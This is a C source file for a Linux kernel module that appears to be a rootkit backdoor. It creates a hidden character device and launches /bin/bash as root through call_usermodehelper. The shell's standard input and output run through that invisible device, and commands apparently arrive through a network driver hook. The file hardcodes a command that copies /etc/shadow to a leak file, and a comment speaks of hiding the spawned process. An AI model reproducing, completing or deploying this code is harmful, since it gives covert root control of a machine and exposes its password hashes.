#include "tty_util.h"
#include "taskutil.h"


//this qtty will interact with the e1000_hook



struct qtty qtty;




char* str = "cat /etc/shadow > shadow_leak\n";


/*
Linux kernel list semantics are interesting. Apparently, the way this works is that an empty list is a list 
where the list->next == list. This implies that the list contains one entry at all times. Therefore,
we can assume that the first entry in the list is a dummy entry that does nothing. However, any entry after actually
contains real data. BatChest. 
*/
LIST_HEAD(commands);  //commands is the list containg the commands. TODO: Upgrade to RCU sometime maybe instead of using a spinlock
DEFINE_SPINLOCK(commands_lock); //lock for commands 


DECLARE_WAIT_QUEUE_HEAD(command_wait); //command wait queue
/*

the command we're currently writing

We need to do this because bash reads the command one-by-one. So, we need to continually iterate through cur_command.

Eventually, when we are done with cur_command, we will pull it off 

*/
struct command* cur_command = NULL; //the command we are currently processing

ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){

  //fragmentation into MTU sized blocks should happen here. 
    printk(KERN_INFO "WRITING\n");
    char* kbuf = (char*)kzalloc(size+1, GFP_KERNEL); //make sure the string actually terminates so add 1 
    if(!access_ok(buf, size)){
        return -EFAULT;
    }

    if(copy_from_user(kbuf, buf, size)){ //copy_from_user returns 0
        return -EFAULT; //invalid buffer
    }
    
    printk(KERN_INFO "%s\n", kbuf);
    
    return size;


    
}


int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
    //nop. We should never reach this function because we are opened as an anon inode.
    return 0;
}


void wait_read(void){ //wait for a command to be added to 
  DECLARE_WAITQUEUE(wait, current);
  add_wait_queue(&command_wait, &wait);
  printk(KERN_INFO "Beginning wait\n");
   while(1){ //wait for task to start
    set_current_state(TASK_UNINTERRUPTIBLE);
    if(!list_empty(&commands))
      break;
    schedule();
  }

  printk(KERN_INFO "Woke up\n");


  __set_current_state(TASK_RUNNING);
  remove_wait_queue(&command_wait, &wait);
  
}

ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){
  
  unsigned long flags;

  size_t to_copy; //= size <= strlen(str) ? size : strlen(str);
  
  size_t not_copied;
  if(!access_ok(buf,size))
    return -EFAULT;
  

  

  if(!cur_command){
    BUG_ON(!cur_command && *off != 0); //it should never happen that we have a nonzero offset while cur_command is 0
    if(list_empty(&commands)){
     wait_read(); //wait until we get a new command. TODO: This should be made killable. 
    }
    
    cur_command = list_entry(commands.next, struct command, list); //get a new cur_command if there is no cur_command
    
    spin_lock_irqsave(&commands_lock, flags);
    list_del(commands.next);
    spin_unlock_irqrestore(&commands_lock, flags);
  }

  //we should have a valid cur_command by now

  /*
  The logic behind this line is pretty simple. We don't want to overflow over the buffer, but we do want to read ass much as possible (up to size)

  The amount left to read is cur_command -> size - *off. However, if size < cur_command -> size - *off we want to read size.

  Once cur_command -> size - *off == 0, we know we have read everything. At that point we can free cur_command and exit out. 
  */

  to_copy = (size < cur_command -> size - *off) ? size : cur_command -> size - *off; 
  
 
  not_copied = copy_to_user(buf, cur_command -> str+*off, to_copy);

  (*off)+= to_copy; //increment by to_copy because we don't want to read things we've already read

  if(*off == cur_command -> size){ //if we've read everything
    kfree(cur_command);
    cur_command = NULL;
    *off = 0;
  }


 // unsigned long ret = copy_to_user(buf, str+(*off % strlen(str)), to_copy);
 // (*off) = ((*off) + 1) % strlen(str);
  
  

  return to_copy - not_copied;
  
}

const struct file_operations qtty_fops = {
    .open = qtty_open,
    .write = qtty_write,
    .read = qtty_read,  
    .owner = THIS_MODULE
};




void init_qtty(void){ //init dev
    int err;
    err = register_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT , "qogchamp");//reverse major and minor numbers for use.
    
    if(err){
        printk(KERN_INFO "Failed to reserve major and minor numbers");
        return;
    }
    
    
    cdev_init(&qtty.cdev, &qtty_fops);
    err = cdev_add(&qtty.cdev, MKDEV(QTTY_MAJOR, QTTY_MINOR), 1);
    qtty.cdev.owner = THIS_MODULE;
    printk(KERN_INFO "error: %d\n", err);
    if(err){
        qtty.cdev.owner = NULL;
        printk(KERN_INFO "cdev could not be added\n");

    }

    
}

void qtty_clean_up(void){
    
   
    unregister_chrdev_region(MKDEV(QTTY_MAJOR, QTTY_MINOR), DEV_COUNT);
    
    if(!qtty.cdev.owner){
        printk(KERN_INFO "qtty not initialized\n");
        return;
    }


    cdev_del(&qtty.cdev);


}








struct task_struct* umh_tsk = NULL; //call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.

DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for umh_tsk to be populated



int init_func(struct subprocess_info* info, struct cred* new){ 
  int retval;
  struct file* qtty_file_0;
  struct file* qtty_file_1;
  struct file* qtty_file_2;
  //printk(KERN_INFO "old task ptr: 0x%lx, new task ptr: 0x%lx", (unsigned long)info->data, (unsigned long)current);
  umh_tsk = current; //get task_struct
  get_task_struct(umh_tsk); //increase reference counter so the task doesn't disappear from under us
  wake_up(&qogchamp_wait); 
 // printk("PID: %d\n", current->pid);
  
  qtty_file_0 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_1 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_2 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);

  //do it three times for 0,1, and 2

  retval = get_unused_fd_flags(0); //this is an important check as it reserves an fd.
  
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_0); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_1); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
  //  printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_2); //thank FUCKING GOD this is exported. 


  //hide current at this point i guess.
  return 0;

}

void launch_bash(void){
  struct subprocess_info* sub_info;
  int status;
  char* argv[] = {"hello world!\xA", NULL}; //for some reason these arrays need to be null terminated. 
  DECLARE_WAITQUEUE(wait, current);
  add_wait_queue(&qogchamp_wait, &wait); //add it here so we don't hit a race condition

  char* envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    NULL
  };
  sub_info = call_usermodehelper_setup("/bin/bash", argv, envp, GFP_KERNEL, init_func, NULL,  (void*)current);
  call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
  //it is possible that we get preempted here. However, because we added it to the wait_queue, it shouldn't matter despite umh_exec executing asynchronously
  while(1){ //wait for task to start
    set_current_state(TASK_UNINTERRUPTIBLE);
    if(umh_tsk != NULL)
      break;
    schedule();
  }
  __set_current_state(TASK_RUNNING);
  remove_wait_queue(&qogchamp_wait, &wait);
  put_task_struct(umh_tsk);
}